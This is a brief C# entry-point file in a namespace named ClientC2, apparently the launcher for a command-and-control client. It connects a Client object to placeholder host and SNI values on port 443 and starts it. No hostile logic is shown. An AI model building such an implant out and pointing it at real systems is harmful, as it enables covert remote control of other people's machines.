using System;

namespace ClientC2
{
    public class Program
    {
        public static void Main(string[] args)
        {
            Client client = new Client("target.domain.or.ip.address.here", "target.sni.here", 443);
            client.Go();
            Console.ReadKey();
        }
    }
}
